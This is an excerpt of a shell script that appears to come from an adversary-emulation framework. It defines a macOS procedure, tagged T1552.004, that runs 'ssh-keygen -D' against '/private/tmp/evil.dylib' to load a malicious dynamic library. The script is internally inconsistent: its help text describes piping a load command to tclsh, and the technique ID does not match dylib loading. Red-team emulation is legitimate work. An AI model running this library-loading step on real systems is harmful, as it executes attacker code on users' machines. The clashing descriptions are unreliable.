...
TTP_ID="T1552.004" #replace with you coresponding ttp_id
...
EXECUTE_MALICIOUS_DYNAMIC_LIBRARY_DYLIB_FROM_STANDARD_INPUT=false

CMD_SSH_KEYGEN="/usr/bin/ssh-keygen"
...
PROCEDURE_NAME="ssh-keygen"  # Set by build system from YAML procedure_name field
...
# We need to  accomidate the unknown rgs condiuton for the new args we add from the yaml
        --execute-malicious-dynamic-library-dylib-from-standard-input)
            EXECUTE_MALICIOUS_DYNAMIC_LIBRARY_DYLIB_FROM_STANDARD_INPUT=true
            ;;
            *)
...
SCRIPT:
  --execute-malicious-dynamic-library-dylib-from-standard-input An attacker can execute a malicious .dylib from stdin by echoing a load command and piping to tclsh.
...
# Execute functions for --execute-malicious-dynamic-library-dylib-from-standard-input
if [ "$EXECUTE_MALICIOUS_DYNAMIC_LIBRARY_DYLIB_FROM_STANDARD_INPUT" = true ]; then
    core_debug_print "Executing functions for --execute-malicious-dynamic-library-dylib-from-standard-input"
    result=$(execute_function execute_execute_malicious_dynamic_library_dylib_from_standard_input)
    raw_output="${raw_output}${result}"
fi

# Set procedure name for processing
procedure="ssh-keygen"
...
# Function: execute_execute_malicious_dynamic_library_dylib_from_standard_input
# Type: main
# Languages: shell
FUNCTION_LANG="shell"
# Sudo privileges: Not required

execute_execute_malicious_dynamic_library_dylib_from_standard_input() {
    local result
    result=$(ssh-keygen -D /private/tmp/evil.dylib 2>&1)
    $CMD_PRINTF "RESULT|%s\n" "$result"
    return 0
}
